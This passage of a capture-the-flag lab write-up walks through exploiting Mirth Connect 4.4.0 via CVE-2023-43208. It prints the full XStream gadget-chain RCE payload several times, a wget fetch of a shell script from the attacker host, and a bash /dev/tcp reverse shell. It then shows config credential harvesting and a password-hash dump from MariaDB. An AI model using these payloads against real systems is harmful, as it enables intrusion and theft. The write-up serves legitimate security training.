        <jar download="eager" href="webstart/client-lib/staxon-1.3.jar" sha256="jeWRqRwl0xXZzYCV4hHI9L8Ce/sy9mNVsg1LmzrcH0w="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v231-2.3.jar" sha256="Zy3A3/aqpUxulbTzSLOfFS/zskDaRtHqcyktQ9Ppl8U="/>
        <jar download="eager" href="webstart/client-lib/jackson-databind-2.11.3.jar" sha256="HdpB6UnUciJ4xp3AApqF3SD0DC7XceIsoqy+nvtRO/k="/>
        <jar download="eager" href="webstart/client-lib/jersey-guava-2.22.1.jar" sha256="IBqA2V9KW8RRbGf1gi83X1yPbPevBUWvSvSLAsBT/+8="/>
        <jar download="eager" href="webstart/client-lib/joda-time-2.9.9.jar" sha256="lbeoqEup9KalPvZCzypvbbIkaIWi2jlKfSpHlQIt1rw="/>
        <jar download="eager" href="webstart/client-lib/velocity-engine-core-2.2.jar" sha256="hLoIAPaQME4UpUhH4JM/BaRE1XU/aAsKWpO/a7QtlqM="/>
        <jar download="eager" href="webstart/client-lib/javax.inject-2.4.0-b31.jar" sha256="VMorIrzeWoo+lDm5JOnVK0w4Cshu5wEmVgjP6lkqqDw="/>
        <jar download="eager" href="webstart/client-lib/jackson-annotations-2.11.3.jar" sha256="DoOzxry+xCjH7dTFsmeOBqnf6tp/MADddqPAc74EbAw="/>
        <jar download="eager" href="webstart/client-lib/slf4j-api-1.7.30.jar" sha256="4odF1co8Wo88h4Pmg/GzGh2SKMnnn0Yi04e0Og0Rg6o="/>
        <jar download="eager" href="webstart/client-lib/commons-pool2-2.3.jar" sha256="APdgYnfApxJ1KQ+FlfuLhcSYL1J+YfM2gWQG52hhogQ="/>
        <jar download="eager" href="webstart/client-lib/javassist-3.26.0-GA.jar" sha256="CIYZWNSYwYzGL6Br67AC6i0neHBvi2JOpCjRjmJGFI0="/>
        <jar download="eager" href="webstart/client-lib/guava-28.2-jre.jar" sha256="SyoNyKpmdiFudyjFaul5lMleraSD8E85voyrCpzf9dY="/>
        <jar download="eager" href="webstart/client-lib/jaxb-api-2.4.0-b180725.0427.jar" sha256="l9sDNL727nZkvNzCarcpq7jd8VcMu3ss6FNOSG57/NQ="/>
        <jar download="eager" href="webstart/client-lib/httpmime-4.5.13.jar" sha256="7R/v9tFfvVFBimz7msrZ1B6Zfq5bGQqFDkyYFterJMM="/>
        <jar download="eager" href="webstart/client-lib/wizard.jar" sha256="7OYEhgqNU7QJqK9bHGJNJqxFCi4oWVlF8XtYwBaPdOo="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v22-2.3.jar" sha256="OjQVkkOwGi+iGVkPv9q06zuiHw6ER+iUMlZJJHc35ZA="/>
        <jar download="eager" href="webstart/client-lib/miglayout-swing-4.2.jar" sha256="Mx8CMy2FiaUHSLJB4nSirw4XWrQiuzZuHbTK385bnIk="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v25-2.3.jar" sha256="9SblQqKV9egD7z7obYD6BnY/nTXvli5+uPkLYDvsYAs="/>
        <jar download="eager" href="webstart/client-lib/reflections-0.9.10.jar" sha256="IPDk2Q6OmWaPvh4hRXVM0PYCrWryNVd0aaiufWFahNk="/>
        <jar download="eager" href="webstart/client-lib/javaparser-1.0.8.jar" sha256="cUyZFy6pW06C7BeXIVnQH1jSDjn+D6NOvFLdxZm0v3U="/>
        <jar download="eager" href="webstart/client-lib/miglayout-core-4.2.jar" sha256="0ajHMEw8GsCWLq1gSh9zhJp+FRGHhq//sRO2RTz9EtU="/>
        <jar download="eager" href="webstart/client-lib/bcprov-ext-jdk18on-171.jar" sha256="/1v9cPkedM2dS61zfPb1QRczEb2XjDx8IxQ+vX3EgqM="/>
        <jar download="eager" href="webstart/client-lib/jersey-common-2.22.1.jar" sha256="w1a3DUxOzMnN3ShUe3BgqKq+LQZuRXbjf7XPGAGSyH4="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v26-2.3.jar" sha256="/sdcfbvvni4u7iJ7C4fAoGuqBV3SKt+oaeaUmrz7soc="/>
        <jar download="eager" href="webstart/client-lib/javax.ws.rs-api-2.0.1.jar" sha256="1anYrmLH6XVLuL6UdyHChnVC63G88ZN6ksYVKDHrwWY="/>
        <jar download="eager" href="webstart/client-lib/rhino-1.7.13.jar" sha256="9YLjcaeQjbLFrlnNeNAPPFyO7GwkWeoivlB+cHf/LGw="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v251-2.3.jar" sha256="PKc8cQQrOWODAnNyWfbj0YGGoZlR2+ekBnToOn9XIp4="/>
        <jar download="eager" href="webstart/client-lib/bcpkix-jdk18on-171.jar" sha256="skuBILkn+PcpJuDP/M9di3Nu3hlq93rYuSSgS2/ovtQ="/>
        <jar download="eager" href="webstart/client-lib/javax.mail-1.5.0.jar" sha256="flDlXMAW8Rl7/D5PRT6aziJ5+BFLgCkly4USmIUJnj0="/>
        <jar download="eager" href="webstart/client-lib/slf4j-log4j12-1.7.30.jar" sha256="7G71CIScs6JqQn95E5IH01sMkDdrP/BDQgCS9ZwmIvE="/>
        <jar download="eager" href="webstart/client-lib/jai_imageio.jar" sha256="Sv+7VsN2v7lCseg/10Hfl+25Z17DIjbBFS5LW8uSCzc="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-api-1.2.0.jar" sha256="v3ndkHoaiEwiTJpm9177HFQztgaZC5VfN9B2jdrkhFs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v27-2.3.jar" sha256="fJ668/E7otWgs7SA1jHiiCpKHSHAiouVPKS3IO1Zcq4="/>
        <jar download="eager" href="webstart/client-lib/userutil-sources.jar" sha256="1BGr/v2Og/FH2XYS244rEs7fsLEu1BmKQmSpWHRn05U="/>
        <jar download="eager" href="webstart/client-lib/bcprov-jdk18on-171.jar" sha256="l7kndUKXP0Boq6mlKee5Qo78WjkJEH2nDYp/+PbhVkI="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v281-2.3.jar" sha256="4s3VMiZqi8XRR8R2ojsgD9sALwtqw4wnSRa0d0YxYtU="/>
        <jar download="eager" href="webstart/client-lib/jersey-client-2.22.1.jar" sha256="gmAUfqtAN3AeddIKF40h1pvUB10Qzdy3+Z6zWKXueTY="/>
        <jar download="eager" href="webstart/client-lib/log4j-api-2.17.2.jar" sha256="Rpvu+JLDk4rkoNnRr8C9xI57yHVBwTB0tvAL8zSi5cY="/>
        <jar download="eager" href="webstart/client-lib/httpclient-4.5.13.jar" sha256="G87KYCKVy/05s9g44w8cILxtugjhab6FyoM24Xcov9M="/>
        <jar download="eager" href="webstart/client-lib/istack-commons-runtime-3.0.6.jar" sha256="r7Pdb2yYKzY3TR1m8Nq8nR52JTeX9WjlGYZWwvQQMrU="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v24-2.3.jar" sha256="m6ulzJ/p9GGit/n3kid3O2VDZSSGdSgzltNd1UVGFuw="/>
        <jar download="eager" href="webstart/client-lib/commons-lang-2.6.jar" sha256="NKmzkdAArMvPlzkusZAE3/wiKSk1XsdzJONkUQvG8dk="/>
        <jar download="eager" href="webstart/client-lib/commons-beanutils-1.9.3.jar" sha256="rpgEMWYeRxs6wfLVCeOCrgm2CWo+QdSNPxLK05zWz9k="/>
        <jar download="eager" href="webstart/client-lib/regions-2.15.28.jar" sha256="DO+3VI3z+GW/FSgxHWsjJ6ddn3FedIBCeRkdvjUSWc0="/>
        <jar download="eager" href="webstart/client-lib/hk2-utils-2.4.0-b31.jar" sha256="1dSEKIqf2Ocip0f+5elBZJxi6UnRoaLg5RsfdzNluTI="/>
        <extension href="webstart/extensions/scriptfilestep.jnlp"/>
        <extension href="webstart/extensions/textviewer.jnlp"/>
        <extension href="webstart/extensions/dicomviewer.jnlp"/>
        <extension href="webstart/extensions/js.jnlp"/>
        <extension href="webstart/extensions/jdbc.jnlp"/>
        <extension href="webstart/extensions/mapper.jnlp"/>
        <extension href="webstart/extensions/directoryresource.jnlp"/>
        <extension href="webstart/extensions/datapruner.jnlp"/>
        <extension href="webstart/extensions/javascriptrule.jnlp"/>
        <extension href="webstart/extensions/datatype-xml.jnlp"/>
        <extension href="webstart/extensions/datatype-ncpdp.jnlp"/>
        <extension href="webstart/extensions/jms.jnlp"/>
        <extension href="webstart/extensions/datatype-json.jnlp"/>
        <extension href="webstart/extensions/xsltstep.jnlp"/>
        <extension href="webstart/extensions/file.jnlp"/>
        <extension href="webstart/extensions/scriptfilerule.jnlp"/>
        <extension href="webstart/extensions/messagebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-dicom.jnlp"/>
        <extension href="webstart/extensions/serverlog.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v3.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v2.jnlp"/>
        <extension href="webstart/extensions/ws.jnlp"/>
        <extension href="webstart/extensions/javascriptstep.jnlp"/>
        <extension href="webstart/extensions/dashboardstatus.jnlp"/>
        <extension href="webstart/extensions/datatype-raw.jnlp"/>
        <extension href="webstart/extensions/tcp.jnlp"/>
        <extension href="webstart/extensions/datatype-edi.jnlp"/>
        <extension href="webstart/extensions/smtp.jnlp"/>
        <extension href="webstart/extensions/globalmapviewer.jnlp"/>
        <extension href="webstart/extensions/httpauth.jnlp"/>
        <extension href="webstart/extensions/dicom.jnlp"/>
        <extension href="webstart/extensions/imageviewer.jnlp"/>
        <extension href="webstart/extensions/mllpmode.jnlp"/>
        <extension href="webstart/extensions/pdfviewer.jnlp"/>
        <extension href="webstart/extensions/destinationsetfilter.jnlp"/>
        <extension href="webstart/extensions/vm.jnlp"/>
        <extension href="webstart/extensions/http.jnlp"/>
        <extension href="webstart/extensions/doc.jnlp"/>
        <extension href="webstart/extensions/rulebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-delimited.jnlp"/>
    </resources>

    <application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://10.129.244.184:443</argument>
        <argument>4.4.0</argument>
    </application-desc>

</jnlp>
```

I’ll skip the directory brute force as this is open source software.

### HL7 v2 MLLP - TCP 6661

Port 6661 doesn’t show anything interesting when hit with `nc` or `curl`.

It’s not needed to solve the box, but knowing that Mirth Connect is running suggests that 6661 is likely the HL7 v2 MLLP listener. Claude will give me a one liner to test this:

![image-20260527194334788](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260527194334788.webp)

When I run that, it generates a response:

```
oxdf@hacky$ python3 -c "import socket; s=socket.socket(); s.connect(('10.129.244.184',6661)); s.sendall(b'\x0bMSH|^~\\&|TEST|TEST|MIRTH|MIRTH|20260527||ADT^A01|123|P|2.3\r\x1c\r'); print(s.recv(4096)); s.close()"
<string>:1: SyntaxWarning: invalid escape sequence '\&'
b'\x0bMSH|^~\\&|MIRTH|MIRTH|TEST|TEST|20260527194151.620||ACK|20260527194151.620|P|2.3\rMSA|AA|123\r\x1c\r'
```

The ACK comes back framed in MLLP and the MSH header identifies the sending application as `MIRTH|MIRTH`. The HL7 listener is happily telling unauthenticated clients exactly what it is.

## Shell as mirth

### Identify CVE(s)

Searching for “mirth connect 4.4.0 cve” shows references to a couple vulnerabilities:

![image-20260522094747554](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522094747554.webp)

Both CVE-2023-43208 and CVE-2023-37679 are labeled as RCE vulnerabilities that could be interesting.

### CVE-2023-37679 / CVE-2023-43208 Background

CVE-2023-37679 is a deserialization vulnerability patched by 4.4.0 with a deny-list to prevent an exploit from accessing known dangerous classes. However, it was incomplete, which allowed exploits to still get RCE, leading to CVE-2023-43208 and a proper fix in 4.4.1.

NIST describes [CVE-2023-37679](https://nvd.nist.gov/vuln/detail/CVE-2023-37679) as:

> A remote command execution (RCE) vulnerability in NextGen Mirth Connect v4.3.0 allows attackers to execute arbitrary commands on the hosting server.

It describes [CVE-2023-43208](https://nvd.nist.gov/vuln/detail/CVE-2023-43208) as:

> NextGen Healthcare Mirth Connect before version 4.4.1 is vulnerable to unauthenticated remote code execution. Note that this vulnerability is caused by the incomplete patch of CVE-2023-37679.

Horizon3.ai originally discovered these vulnerabilities, though their [announcement](https://horizon3.ai/attack-research/disclosures/nextgen-mirth-connect-remote-code-execution/) doesn’t give much detail, but [this post](https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/) does. A Metasploit [exploit module](https://www.rapid7.com/db/modules/exploit/multi/http/mirth_connect_cve_2023_43208/) was published in January 2024.

These are insecure deserialization vulnerabilities in the Mirth Connect API. The root cause is the `XmlMessageBodyReader` class, which uses the XStream library to unmarshal XML request bodies into Java objects. The API runs on Jersey (JAX-RS), and to build a method’s parameter object Jersey invokes this body reader before the method’s logic runs. Mirth checks authorization inside the resource method, not in a pre-matching filter, so the XML body is deserialized before the auth check is reached. The gadget chain therefore executes as a side effect of deserialization, ahead of any authentication. Public POCs target POST `/api/users` because it accepts an XML body that gets deserialized to construct the method parameter before the in-method auth check runs.

The 4.4.0 patch for CVE-2023-37679 tried to block this with an XStream denylist of known-dangerous classes. CVE-2023-43208 bypasses that denylist by using a different gadget chain built from classes that were not on the list (for example `InvokerTransformer` from Apache Commons Collections). Version 4.4.1 fixes it properly by dropping the denylist in favor of an explicit allowlist of safe classes.

### Exploit

#### Manual POC

The [Horizon3.ai writeup](https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/) shows the various payloads they used all via the swagger API page. I’ll grab their payload from the very bottom of the post:

```xml
<sorted-set>
  <string>abcd</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string><<COMMAND>></string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

11 lines up from the bottom there’s a `<string><<COMMAND>></string>`. I’ll replace `<<COMMAND>>` with a command and put it in the `/users` POST endpoint:

![image-20260522102448723](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260522102448723.webp)

When I run this, an ICMP packet arrives at my host:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:12:48.357520 IP 10.129.244.184 > 10.10.14.51: ICMP echo request, id 5114, seq 1, length 64
14:12:48.357546 IP 10.10.14.51 > 10.129.244.184: ICMP echo reply, id 5114, seq 1, length 64
```

That’s RCE.

#### Script POC

There’s a script at the bottom of the post with a Python script. I’ll run it:

```
oxdf@hacky$ uv run --with requests cve-2023-43208.py -c 'ping -c 1 10.10.14.51' -u http://10.129.244.184
Installed 5 packages in 8ms
Sending payload:
<sorted-set>
  <string>abcd</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string>ping -c 1 10.10.14.51</string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>

Payload sent. Received status code: 500
```

The ICMP comes again:

```
14:26:33.679910 IP 10.129.244.184 > 10.10.14.51: ICMP echo request, id 5122, seq 1, length 64
14:26:33.679937 IP 10.10.14.51 > 10.129.244.184: ICMP echo reply, id 5122, seq 1, length 64
```

#### Shell

Running commands with pipes or other redirects in Java-based RCEs almost always fails. I’ll use a two stage solution to get a shell. I’ll create a shell script with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.51/443 0>&1
```

I’ll use two RCE commands, first to fetch the script:

```
oxdf@hacky$ uv run --with requests cve-2023-43208.py -c "wget 10.10.14.51/shell.sh" -u https://10.129.244.184 
Sending payload:
<sorted-set>
  <string>abcd</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string>wget 10.10.14.51/shell.sh</string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>

Payload sent. Received status code: 500
```

At my Python webserver there’s a fetch:

```
10.129.244.184 - - [22/May/2026 10:31:09] "GET /shell.sh HTTP/1.1" 200 -
```

Then another to execute the reverse shell:

```
oxdf@hacky$ uv run --with requests cve-2023-43208.py -c "bash shell.sh" -u https://10.129.244.184
Sending payload:
<sorted-set>
  <string>abcd</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
      <target class="org.apache.commons.collections4.functors.ChainedTransformer">
        <iTransformers>
          <org.apache.commons.collections4.functors.ConstantTransformer>
            <iConstant class="java-class">java.lang.Runtime</iConstant>
          </org.apache.commons.collections4.functors.ConstantTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>getMethod</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
              <java-class>[Ljava.lang.Class;</java-class>
            </iParamTypes>
            <iArgs>
              <string>getRuntime</string>
              <java-class-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>invoke</iMethodName>
            <iParamTypes>
              <java-class>java.lang.Object</java-class>
              <java-class>[Ljava.lang.Object;</java-class>
            </iParamTypes>
            <iArgs>
              <null/>
              <object-array/>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
          <org.apache.commons.collections4.functors.InvokerTransformer>
            <iMethodName>exec</iMethodName>
            <iParamTypes>
              <java-class>java.lang.String</java-class>
            </iParamTypes>
            <iArgs>
              <string>bash shell.sh</string>
            </iArgs>
          </org.apache.commons.collections4.functors.InvokerTransformer>
        </iTransformers>
      </target>
      <methodName>transform</methodName>
      <eventTypes>
        <string>compareTo</string>
      </eventTypes>
    </handler>
  </dynamic-proxy>
</sorted-set>

Payload sent. Received status code: 500
```

This time there’s a connection at `nc`:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.184 43630
bash: cannot set terminal process group (3578): Inappropriate ioctl for device
bash: no job control in this shell
mirth@interpreter:/usr/local/mirthconnect$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
mirth@interpreter:/usr/local/mirthconnect$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
mirth@interpreter:/usr/local/mirthconnect$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
mirth@interpreter:/usr/local/mirthconnect$
```

## Shell as sedric

### Enumeration

#### Users

`mirth` is a service account. Looking at real users, only one other account has a home directory in `/home`:

```
mirth@interpreter:/home$ ls
sedric
```

`/etc/passwd` confirms that sedric and root are the only accounts with a login shell:

```
mirth@interpreter:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
```

`sudo` isn’t installed on this host:

```
mirth@interpreter:/$ sudo -l
bash: sudo: command not found
```

#### Mirth

The mirth user doesn’t have a home directory, but the Mirth Connect installation is located in `/usr/local/mirthconnect`:

```
mirth@interpreter:/usr/local/mirthconnect$ ls
client-lib  logs                 mirth-server-launcher.jar  server-lib
conf        mcserver             preferences                shell.sh
custom-lib  mcserver.vmoptions   public_api_html            uninstall
docs        mcservice            public_html                webapps
extensions  mcservice.vmoptions  server-launcher-lib
```

The `conf` directory has configuration files:

```
mirth@interpreter:/usr/local/mirthconnect/conf$ ls
dbdrivers.xml  log4j2.properties  mirth.properties
```

The interesting one is `mirth.properties`. It’s very long, so I’ll show interesting bits. This sets the HTTP and HTTPS ports:

```bash
# ports
http.port = 80
https.port = 443
```

The keystore is a Java KeyStore. Despite the `.jks` filename, `keystore.type` is set to `JCEKS` (Java Cryptography Extension KeyStore). Unlike the default `JKS` type, a JCEKS store can hold symmetric secret keys in addition to certificates and private keys. `mirth.properties` also hands over both passwords needed to open it:

```bash
# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE 
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS
```

`keystore.storepass` unlocks the keystore file itself, and `keystore.keypass` unlocks the individual key entries inside it. `${dir.appdata}` is defined earlier in `mirth.properties`, which resolves the keystore path to `/usr/local/mirthconnect/appdata/keystore.jks`. Mirth uses this keystore for two things: the TLS certificate for the HTTPS listener (the self-signed `mirth-connect` certificate from the nmap scan), and a symmetric secret key that Mirth’s encryptor uses to protect sensitive values such as channel and connector passwords. I can list this store with `keytool -list -v -keystore /usr/local/mirthconnect/appdata/keystore.jks -storetype JCEKS -storepass 5GbU5HGTOOgE`, but there’s nothing interesting.

There are a bunch of a database info as well:

```bash
# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb 
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB 
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123! 

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000
```

#### Database

I’ll use the connection info from the config to connect to MySQL:

```
mirth@interpreter:/$ mysql -u mirthdb -p'MirthPass123!' mc_bdd_prod
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mc_bdd_prod]>
```

The database has 21 tables:

```
MariaDB [mc_bdd_prod]> show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.001 sec)
```

The `PERSON` table has one row:

```
MariaDB [mc_bdd_prod]> select * from PERSON;
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.001 sec)
```

There is no password column. The `PERSON_PASSWORD` table gives the password hash for a given user id:

```
MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.001 sec)
```

### Crack Password

#### Identify Algorithm

Password hashing is done in `DefaultUserController.java` in the `checkOrUpdateUserPassword` [method](https://github.com/nextgenhealthcare/connect/blob/development/server/src/com/mirth/connect/server/controllers/DefaultUserController.java#L152):

```java
public List<String> checkOrUpdateUserPassword(Integer userId, String plainPassword) throws ControllerException {
        StatementLock.getInstance(VACUUM_LOCK_PERSON_STATEMENT_ID).readLock();
        try {
            Digester digester = ControllerFactory.getFactory().createConfigurationController().getDigester();
            PasswordRequirements passwordRequirements = ControllerFactory.getFactory().createConfigurationController().getPasswordRequirements();
            List<String> responses = PasswordRequirementsChecker.getInstance().doesPasswordMeetRequirements(userId, plainPassword, passwordRequirements);
...[snip]...
            userPasswordMap.put("password", digester.digest(plainPassword));
...[snip]...
```

The `Digester` comes from `Digester.java`, where the `digest` function is defined:

```java
public String digest(final String message) throws EncryptionException {
    if (message == null) {
        return null;
    }

    try {
        if (!isInitialized()) {
            initialize();
        }

        byte[] salt = saltGenerator.generateSeed(saltSizeBytes);
        byte[] digest = digest(message, salt);

        if (format == Output.HEXADECIMAL) {
            return Hex.encodeHexString(digest);
        } else {
            return new String(Base64.encodeBase64Chunked(digest), charset);
